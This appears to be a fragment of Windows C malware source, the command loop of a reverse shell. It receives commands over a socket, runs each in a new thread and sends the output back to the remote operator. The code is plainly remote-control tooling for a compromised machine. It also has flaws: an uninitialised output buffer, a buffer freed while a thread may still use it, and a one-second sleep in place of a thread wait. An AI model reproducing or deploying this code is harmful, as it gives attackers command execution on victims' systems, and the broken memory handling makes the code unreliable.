#include "../header/reverse.h"

DWORD WINAPI command_handler(void *inf)
{
	struct main_struct * m_s = (struct main_struct*)inf;		// retreive the struct pointer
	char * send_buf;

	if(exe(m_s->buf, send_buf) < 0) {		// execute the given command.
		printf("cant use program");
	}
	printf("whatever = %s\n", send_buf);
	sender(m_s->s, send_buf, strlen(send_buf), &m_s->cn);		// send output
	free(send_buf);							// free the allocated output.
	return 0;
}

int reverse_shell(struct main_struct *m_s)
{
	HANDLE command_thread;						// create the thread

	while(m_s->cn != SOCKET_ERROR) {				// while connected
		m_s->buf = malloc(1024 * sizeof(char));			// allocate memory for the buffer
		receiver(m_s->s, m_s->buf, 1024, &m_s->cn);
		printf("%s\n", m_s->buf);
		command_thread = CreateThread(NULL, 0, command_handler, (void *)m_s, 0, NULL);
		if(command_thread){					// create thread and check its existance
			sleep(1); // wait for 1 second for cmd to process after reading again.
				// this part should be a wait for thread
		}
		free(m_s->buf);						// free buffer memory
	}
}
